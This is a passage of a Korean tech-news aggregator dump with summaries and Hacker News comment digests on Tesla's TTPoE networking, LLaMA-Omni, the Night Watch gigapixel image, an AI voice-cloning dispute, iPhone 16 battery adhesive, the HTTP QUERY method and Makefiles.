     * 훈련 데이터는 많은 IO 대역폭을 요구하는 비디오를 다루며, 단일 텐서의 크기는 Tesla의 비전 응용 프로그램의 경우 1.7GB에 달할 수 있음
     * Tesla는 호스트 머신이 데이터를 슈퍼컴퓨터로 푸시하는 속도에 의해 Dojo 슈퍼컴퓨터의 처리량이 제한될 수 있음을 발견함

TTPoE의 필요성

     * Tesla는 더 많은 호스트를 추가하고 이러한 추가 호스트를 슈퍼컴퓨터에 저렴하게 연결하는 방법으로 이 문제를 해결함
     * InfiniBand와 같은 일반적인 슈퍼컴퓨터 네트워킹 솔루션 대신 Tesla는 수정된 전송 계층으로 이더넷을 그들의 요구 사항에 맞게 조정하기로 선택함
     * TCP는 Tesla Transport Protocol over Ethernet(TTPoE)로 대체되며, 마이크로초 단위의 지연 시간을 제공하고 간단한 하드웨어 오프로드를 허용하도록 설계됨

TTPoE의 특징

     * TTPoE는 완전히 하드웨어에서 처리되도록 설계되었으며 표준 TCP 프로토콜보다 더 나은 지연 시간을 제공함
     * TTPoE의 상태 머신은 TCP에 비해 크게 단순화됨
     * TCP의 대기 상태를 제거하여 지연 시간이 감소됨
     * TTP는 TIME_WAIT 상태를 삭제하고 3번의 전송에서 2번의 전송으로 연결 종료 시퀀스를 변경함
     * TCP의 3-way 핸드셰이크를 2-way로 변경하여 연결 설정 지연 시간을 단축함

TTPoE의 혼잡 제어

     * TCP와 마찬가지로 Tesla는 혼잡 제어를 위해 패킷 손실을 사용함
     * Tesla는 저지연 기본 네트워크에서 실행되도록 설계되었기 때문에 문제에 대해 무차별 대입 방식을 사용할 수 있었음
     * 전통적인 TCP 구현은 슬라이딩 혼잡 윈도우를 유지 관리하지만 TTP는 그렇지 않음
     * 하드웨어는 SRAM 버퍼에서 전송된 데이터를 추적하며, 이는 혼잡 윈도우 크기를 정의함
     * 전통적인 TCP 혼잡 제어 알고리즘은 Tesla의 Dojo 슈퍼컴퓨터 응용 프로그램에 효과적이기에는 너무 긴 시간 척도로 작동함

TTPoE 하드웨어 구현

     * Tesla는 칩과 표준 이더넷 하드웨어 사이에 배치된 하드웨어 블록에서 TTP 프로토콜을 처리함
     * 이 MAC 하드웨어 블록은 CPU 설계자가 설계했으며 많은 CPU 설계 기능을 도입함
     * 발표자는 이를 공유 캐시처럼 작동한다고 설명했으며, 중재자는 순서 위험을 고려하여 요청 중에서 선택함
     * 가장 두드러지는 리소스 중 하나는 1MB 전송 SRAM 버퍼로, 위에서 언급한 것처럼 혼잡 윈도우를 정의함

Mojo NIC

     * TPP MAC은 Tesla가 ""Dumb-NIC""라고 부르는 것에 구현됨
     * 가능한 한 저렴하고 단순하기 때문에 ""dumb""라고 불림
     * Tesla는 Dojo 슈퍼컴퓨터에 데이터를 공급하기 위해 많은 수의 호스트 노드를 배포하려고 하며, 저렴한 네트워크 카드를 사용하면 비용 효율적인 방식으로 이를 달성할 수 있음
     * Mojo라는 이름은 추가 호스트 노드가 성능을 유지하기 위해 Dojo에 더 많은 Mojo를 제공한다는 아이디어에서 유래함
     * Mojo 카드는 원격 호스트 머신에 설치되며, 엔지니어가 Dojo 슈퍼컴퓨터에 데이터를 공급하기 위해 더 많은 대역폭이 필요한 경우 풀에서 원격 호스트 머신을 끌어올 수 있음

요약

     * Mojo와 TTPoE 프로토콜은 잘 알려진 전송 제어 프로토콜(TCP)이 고품질 슈퍼컴퓨터 내부 네트워크에서 사용하기 위해 단순화될 수 있는 방법에 대한 흥미로운 통찰력을 제공함
     * 이 프로토콜은 이론적으로 인터넷에서 실행될 수 있지만 고정 혼잡 윈도우와 같은 단순화는 인터넷 서비스 제공업체 및 그 이상으로 연결되는 품질이 낮은 링크에서는 잘 작동하지 않을 것임
     * InfiniBand와 같은 다른 슈퍼컴퓨팅 네트워크 솔루션과 비교하여 이더넷을 통한 사용자 정의 전송 프로토콜은 Dojo의 요구 사항을 충족하기에 충분한 추가 대역폭을 제공할 수 있음
"
"https://news.hada.io/topic?id=16844","LLaMA-Omni - LLM과의 원활한 음성 인터랙션","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     LLaMA-Omni - LLM과의 원활한 음성 인터랙션

     * 지연 시간이 짧은 고품질의 엔드투엔드 음성 상호작용 모델
     * Llama-3.1-8B-Instruct 기반으로 구축되어 GPT-4o 수준의 음성 기능을 달성하는 것을 목표로 함
     * 226ms의 낮은 지연 시간
     * 텍스트와 음성 응답을 동시에 생성

GN⁺의 정리

     * LLaMA-Omni는 Llama-3.1-8B-Instruct 기반의 음성-언어 모델로, 낮은 지연 시간과 높은 품질의 음성 상호작용을 지원함
     * 텍스트와 음성 응답을 동시에 생성할 수 있어 다양한 응용 분야에서 유용함
     * 4개의 GPU로 3일 이내에 훈련이 완료되어 효율적임
     * Gradio 데모를 통해 쉽게 상호작용할 수 있으며, 로컬 추론도 가능함
     * 유사한 기능을 가진 프로젝트로는 OpenAI의 Whisper와 Google의 Speech-to-Text API가 있음

        Hacker News 의견

     * ""텍스트로 표현할 수 없는 소리를 재생할 수 있는지""에 대한 질문
     * 순수 텍스트 모델보다 이 모델의 장점이나 잠재력에 대한 의문
          + 모델이 발전함에 따라 TTS에서 잃어버리는 억양, 리듬, 감정을 제대로 해석하거나 생성할 수 있는지에 대한 기대
     * ""STT -> LLM -> TTS""가 아닌지에 대한 질문
          + Chewbacca 소리를 입력하면 모델이 이를 무의미한 소리로 인식할지, 아니면 엉성한 STT로 무작위 단어로 해석할지에 대한 의문
     * Ollama, LM Studio, llama.cpp 같은 모델 운영자들이 이를 지원하는지에 대한 질문
     * 데모 클립의 TTS 목소리가 Valve 성우 Ellen McLain과 매우 유사함
          + Ellen McLain 위키피디아 링크
     * 속도가 매우 좋음
          + 최근 LMStudio + AnythingLLM을 설정하여 로컬 음성 채팅을 시도했지만 여전히 원하는 것보다 느림
          + PiperTTS 목소리가 더 나음
     * 상업적 사용을 위해 목소리 미세 조정이 중요한 요구 사항으로 보임
          + 훈련이나 미세 조정 코드가 있었으면 좋겠음
     * 추가 미세 조정이 불가능한지에 대한 의문
     * 성능을 보여주는 데모가 있는지에 대한 질문
     * GitHub 저장소의 별 히스토리 그래프가 있는 경우 신뢰도가 떨어진다고 느끼는지에 대한 의문
"
"https://news.hada.io/topic?id=16870","초고해상도 이미지 'The Night Watch' (2022)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   초고해상도 이미지 'The Night Watch' (2022)

     * 초고해상도 이미지의 야경
          + 이미지 생성 방법
               o 새로운 고해상도 이미지가 회화 이미징 기술의 큰 진전을 나타냄
               o 해상도는 5 µm (0.005 mm)로, 각 픽셀이 인간의 적혈구보다 작은 영역을 커버함
               o 이미지 크기는 925,000 x 775,000 픽셀, 총 717 기가픽셀, 파일 크기는 5.6 TB임
     * 그리드
          + 이 거대한 이미지를 만들기 위해 100메가픽셀 Hasselblad H6D 400 MS 카메라로 97행 87열의 그리드로 사진 촬영
          + 각 8,439개의 사진은 정교한 레이저 유도 5축 카메라 위치 시스템을 사용하여 캡처됨
          + 카메라 위치가 1/8 mm라도 어긋나면 이미지가 쓸모없게 됨
     * 신기술
          + 이전에 공개된 20 µm 해상도의 이미지를 가이드로 사용하여 더 높은 해상도의 이미지를 정렬하는 데 도움을 줌
          + 이 기술은 Operation Night Watch 동안 수집된 다른 유형의 이미지를 정확하게 정렬할 수 있게 함
     * 회화의 물리적 상태
          + 왜 이렇게 거대한 이미지를 만들었는가?
               o 이 해상도로 인해 그림의 정확한 물리적 상태를 매우 명확하게 볼 수 있음
               o 납 비누 돌출부, 작은 균열, 개별 페인트 색소 입자의 형태, 과거의 수정, 렘브란트의 회화 기법의 아름다운 세부 사항 등이 매우 선명하게 보임
               o 연구자들이 그림의 상태를 이해하고 미래의 보존 처리를 위한 최상의 계획을 세울 수 있게 도움
               o 렘브란트가 어떻게 그림을 그렸는지 더 잘 이해할 수 있게 하며, 이 순간의 '야경'의 정교한 '스냅샷'을 생성함
     * 초고해상도 사진
          + 미세한 색소 입자까지 확대 가능
     * 야경의 누락된 부분 포함
          + 렘브란트가 의도한 대로 작품을 볼 수 있음

GN⁺의 정리

     * 이 기사는 렘브란트의 '야경'을 초고해상도로 촬영한 방법과 그 중요성에 대해 설명함
     * 연구자들이 그림의 상태를 정확히 파악하고 보존 계획을 세우는 데 큰 도움이 됨
     * 이 기술은 회화 이미징 분야에서 큰 진전을 나타내며, 다른 회화 작품에도 적용 가능성이 있음
     * 비슷한 기능을 가진 프로젝트로는 Google의 Art Camera 프로젝트가 있음

        Hacker News 의견

     * 동료가 만든 고해상도 이미지를 탐색할 수 있는 멋진 웹사이트 추천
          + ""https://rijkscollection.net/"";
          + ""rijkscollection hole""에 빠지기 쉬움
     * 몇십 년 전 이 박물관에서 계약직으로 일했던 경험 공유
          + 네덜란드 황금시대의 ""old masters"" 작품에 큰 감흥을 느끼지 못함
          + 현대 미술에 더 관심이 있음
          + ""The Night Watch""의 실제 크기에 놀람
          + 루브르의 모나리자는 작아서 실망스러웠음
     * 고해상도 이미지의 디테일에 감탄
          + 최대 줌에서 작은 균열과 페인트의 세밀한 부분까지 볼 수 있음
          + 깊이 마스크와 인공 ""keylight"" 기능이 추가되면 좋겠음
     * 낮은 해상도의 이미지 다운로드 링크 제공
          + ""https://rijksmuseum.nl/en/search/…;
          + 계정 로그인 없이 다운로드할 수 있는 방법 제안
          + Rijksmuseum이 Van Gogh Museum보다 더 나은 서비스를 제공하고 있음
     * 100MP 디지털 중형 카메라에 대한 흥분
          + Fuji GFX100 카메라로 디지털 이미지 품질이 필름 스캔과 비슷해짐
          + 박물관에서 이 카메라를 사용하는 것이 매우 흥미로움
     * 기술적 측면에 관심 있는 사람들을 위한 Pycon 강연 추천
          + ""https://www.youtube.com/watch?v=z_hm5oX7ZlE"";
     * 카메라 배치의 정밀성에 대한 의문 제기
          + 이미지 스티칭 과정에서 이미지 정렬이 중요함
     * 박물관에서 ""The Night Watch""를 실제로 보고 있는 중에 이 글을 발견한 경험 공유
     * 관련 링크 제공
          + ""Most detailed ever photograph of The Night Watch goes online""
          + ""Ultra High Resolution Photo of Night Watch (2022)""
     * 독일 TV 광고에서 ""The Night Watch""를 창의적으로 재현한 영상 공유
          + ""https://www.youtube.com/watch?v=c6XQXhr7LQM"";
"
"https://news.hada.io/topic?id=16886","AI로 도난당한 나의 목소리","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            AI로 도난당한 나의 목소리

    이메일로 받은 동영상 링크

     * 동영상 내용: Jeff Geerling의 목소리를 사용한 Elecrow의 홍보 동영상
     * 문제 제기: Jeff Geerling은 해당 동영상에서 자신의 목소리를 사용한 적이 없음을 주장

    AI 음성 복제 의혹

     * 의혹: Elecrow가 Jeff Geerling의 YouTube 동영상을 AI 음성 복제 도구에 입력하여 그의 목소리를 사용
     * 과거 사례: OpenAI가 Scarlett Johanssen의 목소리를 복제한 사례를 언급
     * 법적 문제: 비승인 AI 음성 복제에 대한 법적 선례가 부족함

    대응 방안

     * 현재 상황: Elecrow와의 과거 관계는 나쁘지 않았음
     * 법적 대응: 법적 대응은 비용이 많이 들고, YouTube의 서비스 약관 위반 여부도 불확실함
     * 요청 사항: Elecrow에게 해당 동영상을 삭제 요청하는 이메일 발송

    업데이트

     * 이메일 발송: Elecrow에게 AI 음성 사용에 대한 의도와 동영상 삭제 요청
     * 과거 이메일 기록: Elecrow와의 이메일 기록이 43건 이상 존재, 과거에 유료 파트너십 제안도 받았음

    댓글 반응

     * Jimmy: AI를 사용한 것이 확실하며, 이는 매우 부적절한 행동임
     * Gary Hayman: Jeff의 실제 동영상을 좋아하며, 이번 사건은 매우 나쁨
     * Kayla: 동영상의 일부 발음 실수로 인해 AI 음성임을 알 수 있었음
     * BC: AI 음성 복제 도구로 eleven labs를 사용했을 가능성 제기
     * Mike Robinson: BBC의 Tech Life 팟캐스트 에피소드 추천
     * George: 동영상의 목소리가 Jeff와 비슷하지 않다고 주장
     * mam: 상황이 불분명하며, 법적 조치 전에 직접 연락할 것을 권장
     * John: 엔터테인먼트 변호사와 상담할 것을 권장
     * Derek: Elecrow의 제품을 더 이상 구매하지 않겠다고 선언
     * Oh No: 정보의 자유를 주장하는 사람들이 자신들의 콘텐츠가 도용되는 아이러니한 상황

    # GN⁺의 정리

     * AI 음성 복제 문제: AI 기술의 발전으로 인해 비승인 음성 복제가 가능해졌으며, 이는 윤리적 문제를 야기할 수 있음
     * 법적 대응의 어려움: 비승인 음성 복제에 대한 법적 선례가 부족하여 대응이 어려움
     * 콘텐츠 제작자의 권리 보호: 콘텐츠 제작자의 목소리나 이미지를 무단으로 사용하는 것은 윤리적으로나 법적으로 문제가 될 수 있음
     * 대안 제시: AI 음성 복제 대신 실제 성우를 고용하거나 콘텐츠 제작자와 협력하는 것이 바람직함
     * 유사 사례: OpenAI의 Scarlett Johanssen 음성 복제 사례와 BBC의 Tech Life 팟캐스트 에피소드 추천

        Hacker News 의견

     * AI가 사람의 목소리를 모방해 신성모독적인 발언을 할 경우, 폭력 사태가 발생할 수 있음
          + 일부 국가에서는 신성모독으로 인해 폭력적인 린치가 발생하고 있음
          + AI 기술이 발전하면서 이러한 문제가 더 확산될 가능성이 있음
          + 이는 명성, 보안, 저작권과는 무관하게 사람들의 생명을 위협할 수 있음
          + 이를 통제할 도구가 부족함
     * AI를 사용해 목소리를 복제하는 것은 Midler vs. Ford 사건에서 벗어날 수 없을 것임
          + AI를 사용해 목소리를 복제하는 것은 다른 성우를 사용하는 것보다 더 방어하기 어려움
     * 선례는 중요하지만, 기술의 발전으로 인해 새로운 원칙이 필요함
          + 기술이 새로운 능력을 도입할 때, 이를 사람들에게 유익하게 사용할 수 있는 경계를 설정해야 함
          + 그렇지 않으면 강자가 원하는 대로 하고 약자는 고통받는 세상이 될 수 있음
     * LLMs가 궁극의 리믹스 기계라면, RAG를 가진 사람은 디지털 DJ가 될 수 있음
          + 디지털 정보의 도둑질이 무엇을 의미하는지 의문이 생김
          + 법적 선례가 부족한 상황에서 지적 재산권과 저작권 법은 마치 서부 개척 시대와 같음
          + Scarlett Johansson조차 OpenAI의 모방에 대해 고통스러운 편지를 쓸 수밖에 없는 상황에서, 일반적인 사람들은 어떻게 대응할 수 있을지 의문임
          + Geerling처럼 슬프고 화가 나지만, ""모든 선한 것을 위해 친절하고 명예 코드를 따르라""고 말할 수밖에 없음
     * AI 부분을 제외하더라도, Jeff의 의견을 왜곡하거나 그의 이미지를 무단으로 사용하는 것은 잘못된 것임
          + 그의 목소리를 사용함으로써 제품에 대한 암묵적인 (조작된) 지지를 만드는 것은 매우 잘못된 것임
          + 이러한 사례를 다루는 법률이 이미 존재할 것임
     * 나는 작은 기술 유튜버로서 Elecrow와 접촉한 적이 있음
          + Elecrow뿐만 아니라 직원들이 장기적인 파트너십과 비디오 협업을 확보하면 보상, 승진, 커미션을 받음
          + 아마도 누군가가 Jeff의 목소리를 복제하는 것이 영리하다고 생각했을 것임
          + 이는 Elecrow에게 좋은 PR이 아님
          + 그들이 이것이 의도적이었다고 고백할지 궁금함
     * 나는 그것이 그다지 비슷하다고 생각하지 않음
          + 약간 비슷하지만 다름
          + 약간 더 높은 음조, 더 비음, 그리고 억양이 약간 다름
     * 우리는 수백 가지의 목소리 복제 도구를 가지고 있음
          + 물론 복제된 목소리로 된 콘텐츠가 나올 것임
          + 무단으로 사용된 이미지와 마찬가지로, 플랫폼과 그들의 관리 팀은 이를 신고하고 제거하는 절차를 가지고 있음
          + 목소리에 대해서도 비슷한 것이 필요함
     * 변호사는 항상 많은 돈이 든다고 말할 때: 나는 절대적으로 무료로 이 일을 할 것임
          + 하지만 아마도 당신이 내가 면허를 가진 주에 있지 않을 가능성이 큼
          + 만약 당신의 문제가 충분히 흥미롭다면 무료 변호사를 찾을 수 있음
          + 이것은 <i>우리 시대의 가장 흥미로운 문제</i>임
     * Elecrow는 중국 회사인 것 같음
          + 그렇다면 어떤 답변도 기대하지 않음
"
"https://news.hada.io/topic?id=16905","아이폰 16의 전기적 방출 접착제 작동 원리","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        아이폰 16의 전기적 방출 접착제 작동 원리

아이폰 16을 뜯어보다

  수리 용이성의 혁신

     * 첫 번째: 기본 모델과 플러스 모델의 배터리 접착제는 전류를 통과시키면 분리되는 새로운 접착제를 사용함. 이는 기존의 부서지기 쉬운 접착 스트립을 대체하여 일관되고 쉽게 반복 가능한 과정을 제공함. 새로운 도구가 필요함.
     * 두 번째: 16 Pro 배터리는 부드러운 파우치 대신 단단한 강철 케이스를 사용함. 이는 배터리 수리를 더 안전하게 만들어줌.
     * 세 번째: 모든 모델에서 전면 또는 후면을 통해 접근할 수 있는 디자인이 적용됨. 이는 간단한 수리를 더 쉽게 만들어줌.

  FixHub: 새로운 iFixit 도구 발표

     * FixHub Portable Soldering Station: 5초 만에 납땜 준비가 완료되는 모바일 납땜 인두. 자석 캡을 사용하여 안전하게 보관 가능.
     * FixHub Power Series Smart Soldering Iron: USB-C 전원을 사용하여 5초 이내에 가열됨. 컴팩트한 디자인으로 풀 사이즈 납땜 성능 제공.

  새로운 접착제 기술

     * 전기적으로 분리되는 배터리 접착제: Tesa의 ""Debonding on Demand — Electrical Release"" 기술을 사용하여 배터리를 쉽게 분리할 수 있음. 9V 전류를 통해 접착제를 분리함.
     * 새로운 도구 필요: 새로운 배터리 수리 도구가 필요하며, 이는 USB-C 케이블과 악어 클립으로 구성됨. 12V 전류를 통해 60초 내에 배터리를 분리할 수 있음.

  새로운 도구가 수리 용이성에 미치는 영향

     * 새로운 도구 필요성: 새로운 도구가 필요하지만, 이는 쉽게 구할 수 있는 악어 클립과 9V 배터리로 해결 가능함.
     * 접착제의 재사용 가능성: 접착제는 다회용이 아니며, 새로운 배터리를 설치할 때 새로운 접착제를 사용해야 함.

  AI 작업의 열 처리 개선

     * A18 프로세서의 열 처리: 새로운 철 소재의 히트 싱크를 사용하여 열을 효율적으로 처리함. 이는 Neural Engine의 성능을 향상시킴.

  카메라 제어 버튼

     * 새로운 카메라 버튼: 물리적으로 작동하며, 자체 통합 회로를 포함함. 그러나 프레임에 레이저 용접되어 있어 수리가 어려움.

  수리 용이성 평가

     * 수리 매뉴얼: Apple의 수리 매뉴얼은 잘 작성되어 있으며, 출시일에 맞춰 제공됨.
     * 배터리 수리 절차: 새로운 배터리 절차는 매우 견고하며, 비싼 도구가 필요하지 않음.
     * 디자인: 14 시리즈에서 처음 도입된 이중 진입 디자인이 여전히 우아함. 주요 부품에 독립적으로 접근 가능함.
     * 남은 문제: 다양한 나사 유형 사용, 디스플레이 및 후면 패널 접착제는 열을 필요로 함. 그러나 Repair Assistant가 원활하게 작동하여 큰 불만 사항이 해결됨.

   아이폰 16은 7점 만점에 10점을 받음.

GN⁺의 정리

     * 아이폰 16은 수리 용이성에서 큰 진전을 보였음. 새로운 접착제 기술과 이중 진입 디자인은 수리를 더 쉽게 만듦.
     * 새로운 FixHub 도구는 수리 작업을 더 효율적으로 만들어줌.
     * AI 작업의 열 처리 개선은 성능을 향상시킴.
     * 카메라 버튼의 수리 용이성은 여전히 문제로 남아 있음.
     * 전체적으로 아이폰 16은 수리 용이성에서 큰 개선을 이루었으며, 이는 환경 보호에도 긍정적인 영향을 미칠 것임.

        Hacker News 의견

     * 이 웹사이트가 사명에 얼마나 헌신적인지 좋아함
          + 콘텐츠와 도구를 넘어 정책에 영향을 미침
          + 성공적으로 좋은 일을 하고 있음
          + 자신의 산업에서 작은 규모로 재현하고 싶음
     * ifixit이 아이폰의 실제 수리 가능성을 과장함
          + 아이폰 15 디스플레이 가격 350€, s23 108€
          + s23은 120hz OLED, 아이폰은 60hz OLED
          + 유럽에서 비슷한 가격에 판매됨 (800 vs 869€)
          + s23 디스플레이는 서드파티 제조사에서 구매 가능, 애플은 불가능하거나 기능 손실
     * 연구 논문의 인용문:
          + ""두 번째 시나리오에서는 알루미늄 기판 표면의 산화와 Al3+의 접착제로의 이동으로 인해 양극 박리가 발생함. 이는 기판 층이 더 이상 접착제를 지지하지 않기 때문에 빠른 탈착을 초래함""
          + 연구팀의 동영상도 인상적임
     * ""앞이나 뒤로 들어가라"" 디자인
          + The Office를 오랫동안 보지 않았지만, Michael Scott의 반응을 상상하게 되어 아침이 밝아짐
     * 두 명의 룸메이트가 새 아이폰 16 Pro와 ProMax를 구매함
          + 액세서리 포함 AUD$5k 이상 지출
          + 자신의 저렴한 안드로이드 폰은 AUD$290
          + 10배의 가치를 찾을 수 없음
          + 더 나은 카메라가 있음
          + 아이폰의 가치는 어디에 있는지 궁금함
     * 많은 지능적인 사람들이 인생을 바쳐 걸작을 만들고 결국 접착제를 만드는 세상에서 행복함
          + 성당을 더 이상 짓지 않지만 접착제와 포장 세계는 번창하고 있음
     * 배터리가 보통 본체에 접착되는 이유
          + 얇은 고무층이 움직임을 방지할 수 있지 않을까 생각함
     * 접착제에 대해 회의적인 생각
          + 경쟁을 막기 위한 또 다른 트릭일 수 있음
          + 접착제는 배터리와 함께 제공되며, 이 마법의 접착제에 대한 특허가 있을 가능성이 있음
          + 일반 배터리 제조업체가 새로운 배터리에 이 접착제를 추가하지 못하게 함
     * 전화기 메인보드 사진과 관련된 질문: PCB에 왜 그렇게 많은 구멍이 있는지 궁금함
          + 매우 비정상적으로 보임
          + 꽤 큰 영역에 구멍만 있음
     * 9V 배터리가 인기를 잃었다는 기사 내용이 이해되지 않음
          + ""9V 배터리는 6개의 작은 1.5V 셀을 직렬로 연결하여 9V를 달성함. 그러나 많은 셀을 컴팩트한 인클로저에 넣으면 공간이 줄어들어 에너지 밀도가 낮아지고 수명이 짧아짐""
          + 9V 배터리가 6개의 일반 AA 셀보다 에너지 밀도가 낮은 이유가 궁금함
          + AA 셀을 축소하여 직사각형 9V 형태로 포장하면 전체 크기의 AA와 동일한 에너지 밀도가 아닌가 생각함
"
"https://news.hada.io/topic?id=16812","The HTTP Query Method","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         The HTTP Query Method

     * 새로운 HTTP 메소드인 QUERY를 제안
          + Request시에 콘텐츠를 전달할 수 있는, 안전하고 멱등성(idempotent)이 있는 요청 메소드
          + Request에 전달되는 데이터가 너무 커서 URI로 인코딩할 수 없을 때 이 방법을 사용가능
     * 쿼리 매개변수가 수KB 이상일 경우 많은 구현체에서 제한을 둠
          + 요청 전에 이 제한을 미리 알수 없는 경우가 많고, 인코딩 해야하므로 비효율적
     * 그래서 많은 구현에서는 GET 대신 POST를 사용하여 쿼리를 수행
          + 하지만 서버에 대한 구체적인 지식이 없으면, 안전하고 멱등성이 있는지 등을 알 수 없어서 GET과 동일한 기본적 제한이 있음
     * QUERY 메소드는 GET과 POST 사용 간의 격차를 해소하는 솔루션을 제공
          + POST와 마찬가지로 쿼리 작업에 대한 입력은 요청 URI의 일부가 아닌 요청의 컨텐츠 내에서 전달
          + 그러나 POST와 달리 이 메소드는 명시적으로 안전하고 멱등성이 있어, 캐싱 및 자동 재시도와 같은 기능을 할 수 있음

Request

QUERY /contacts HTTP/1.1
Host: example.org
Content-Type: example/query
Accept: text/csv

select surname, givenname, email limit 10

Response

HTTP/1.1 200 OK
Content-Type: text/csv
Content-Location: /contacts/responses/42
Location: /contacts/queries/17

surname, givenname, email
Smith, John, john.smith@example.org
Jones, Sally, sally.jones@example.com
Dubois, Camille, camille.dubois@example.net

   이걸 왜 프로토콜에 추가해야 하는지 모르겠어요.
   쿼리 매개변수가 수 KB를 넘기는 시나리오가 그렇게 많나요?

   https://www.baeldung.com/cs/http-get-with-body
   HTTP 스펙이 독자에게 자체 해석의 여지를 주고 일관성없이 변해서 아예 메소드를 새로 만드려는 걸로 보입니다

   GET with request body

   일부 client library 에는 GET 을 요청할때 아예 request body 를 전달하는 방법이 없는데, 그 대안이 될 수 있을 것 같네요

   라이브러리 구현체의 관점에서 본다면 오히려 더 필요없는 표준 변경 제안이 아닐까요?

   표준 스펙상 GET은 리퀘스트 바디를 가질 수 없는데, 라이브러리가 임의로 리퀘스트 바디를 넘기는거니...
   그럴거면 그냥 라이브러리 단에서 커스텀 메서드를 구현해도 무방한게 아닐까요?

   필요성을 아예 부정하긴 힘들지만, HTTP 1.0에서 1.1로 올라가며 생긴 PUT, PATCH, DELETE 등에 비해 설득력이 떨어지는 것 같습니다.

   https://www.rfc-editor.org/rfc/rfc9110.html#name-method-definitions

   https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET

   https://stackoverflow.com/questions/978061/http-get-with-request-body

   https://elastic.co/guide/en/…
    1. 표준 스펙에서 GET Method 는 body 에 대한 부분을 명시하지 않았지, 넣지 말라고 한적은 없습니다
    2. 서버 프레임워크에서 GET Method 에서 body를 처리하지 않는 경우가 있어서 MDN 에서는 GET Method 에 body 를 넣지 말라고 권장하고 있습니다
    3. Elasticsearch 는 GET Method 에서 Body를 지원합니다

   라이브러리 구현에 의해서 스펙이 변경되야하는건 더 많은 고민이 필요하지 않을까싶네요
"
"https://news.hada.io/topic?id=16872","나는 Makefile을 좋아함","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            나는 Makefile을 좋아함

     * 나는 Makefile을 좋아함. 처음 사용한 지 10년이 넘었음. 당시에도 오래된 기술처럼 보였음. 시간이 지나면서 새로운 빌드 도구들이 등장하고 사라졌지만, Makefile은 여전히 사용되고 있었음. 프로젝트에 참여하면서 익숙해졌고, 어느 순간 좋아하게 되었음. 현재는 새로운 프로젝트를 시작할 때 가장 먼저 사용하는 자동화 도구임.
     * Makefile을 좋아하는 이유는 동일한 명령어 세트를 구현하는 비공식적인 규칙을 따르기 때문임. 새로운 프로젝트를 접할 때 Makefile 파일이 있으면 make 또는 make build를 실행하고 make install을 실행하면 프로젝트가 빌드되고 설정됨. 또는 추가 단계에 대한 정보를 얻을 수 있음.
     * 내 프로젝트에서도 동일한 규칙을 적용하려고 함. 오래된 프로젝트 폴더를 열고 make dev를 실행하면 필요한 모든 단계를 수행하여 프로젝트를 빌드하고 개발 서버를 실행함. 다양한 기술을 사용했기 때문에 각 기술마다 다른 명령어가 있었음. Makefile을 사용하면 몇 달 또는 몇 년 동안 손대지 않은 프로젝트도 쉽게 관리할 수 있음.
     * Makefile은 간단함. 조건문, 플래그 또는 기타 복잡한 기능을 사용하지 않음. 대부분의 작업은 하나 이상의 셸 명령어로 구성됨. 몇 가지 함수가 있는 bash 스크립트를 작성할 수도 있지만, Makefile이 더 쉽고 빠르게 작성할 수 있음.
     * 대부분의 개인 프로젝트에는 다음과 같은 일반적인 작업이 포함됨:
          + dev: 개발 서버 시작
          + build: 프로젝트 빌드 (빌드 단계가 필요한 경우)
          + deploy: 프로젝트 배포/출판
     * 이 블로그에는 단일 타겟을 가진 간단한 Makefile이 있음:
dev:
  npm run dev

     * 더 복잡한 프로젝트에서는 다음과 같은 Makefile을 사용함:
# 개발 서버 실행
dev:
  bundle exec jekyll serve --unpublished -w --config _config.yml,_config-dev.yml --livereload

# 자산 빌드
build:
  npm run gulp build

# 특정 폴더 감시 및 자산 처리
watch:
  npm run gulp watch -- --wip

# 로컬에서 웹사이트 빌드, 암호화 및 Netlify 서버에 배포
deploy:
  JEKYLL_ENV=production bundle exec jekyll build; \
  make encrypt; \
  netlify deploy --prod

# ""_site"" 폴더 암호화
encrypt:
  npx staticrypt _site/*.html -r -d _site

     * 위 예제에서는 phony 타겟의 존재를 무시하고 있음. dev, build, watch, deploy 또는 encrypt라는 파일이 있는 경우 Makefile이 예상대로 작동하지 않을 수 있음.
     * GNU Make는 매우 보편적임. Linux에서는 이미 설치되어 있을 가능성이 높음. MacBook에서도 명시적으로 설치한 기억이 없음. 다른 도구와 함께 설치되었을 것임. Make는 간단하고 다른 빌드 도구보다 추가 종속성이 적음. 제한된 환경에서 유용할 수 있음. Make가 이미 존재할 가능성이 높음. 그렇지 않으면 Makefile의 명령어를 수동으로 셸에서 실행할 수 있음.
     * 다른 빌드 도구를 반대하는 것은 아님. 새로운 빌드 도구를 발견하면 흥미로움. 하지만 여전히 Make를 사용하여 다양한 도구를 관리함.


GN⁺의 정리

     * Makefile은 다양한 프로젝트에서 일관된 명령어 세트를 제공하여 관리가 용이함.
     * 간단한 구문과 적은 종속성으로 제한된 환경에서도 유용하게 사용될 수 있음.
     * 다양한 빌드 도구와 함께 사용할 수 있어 유연성이 높음.
     * 비슷한 기능을 가진 도구로는 CMake, Ninja, Gradle 등이 있음.

   종속성을 정의하지 않은 makefile 은 justfile 로 대체하면 더나은 사용성을 가져옵니다.

        Hacker News 의견

     * Make 사용에 대한 격려
          + Make를 잘못 사용한다고 낙담하지 말라는 의견
          + Make는 단순함이 장점이며, 작은 프로젝트에서는 큰 문제가 되지 않음
          + 대부분의 경우 올바른 방법을 신경 쓸 필요가 없으며, 필요한 만큼의 복잡성만 추가됨
     * Makefiles의 문제점
          + Makefiles는 다른 빌드 시스템보다 덜 나쁘지만 여전히 문제점이 많음
          + 빌드 시스템의 주요 문제점:
               o 너무 기본적임: 복잡한 프로젝트에서는 혼란이 생김
               o 너무 복잡함: 초기 지식과 관리가 과도하게 요구됨
               o 표준 라이브러리 부족: 모든 것을 직접 정의해야 함
               o 너무 제한적임: 필요가 변하면 다른 시스템으로 이동해야 함
               o 너무 많은 마법: 잘못 설계된 시스템의 특징
               o 암호화된 또는 일관성 없는 문법
     * Make의 장점
          + Make를 좋아하는 사람의 의견
          + Make는 단순한 DSL로 파일을 변환하는 명령어 모음임
          + Bash나 다른 쉘로도 가능하지만, Make가 더 간단함
     * PHONY 타겟 사용
          + mtime 기반 의존성 추적을 사용하지 않음
          + 타겟을 PHONY로 정의해야 함
          + 최근에는 just와 justfiles로 전환하여 더 간단하게 사용함
     * Make에 대한 열띤 논쟁
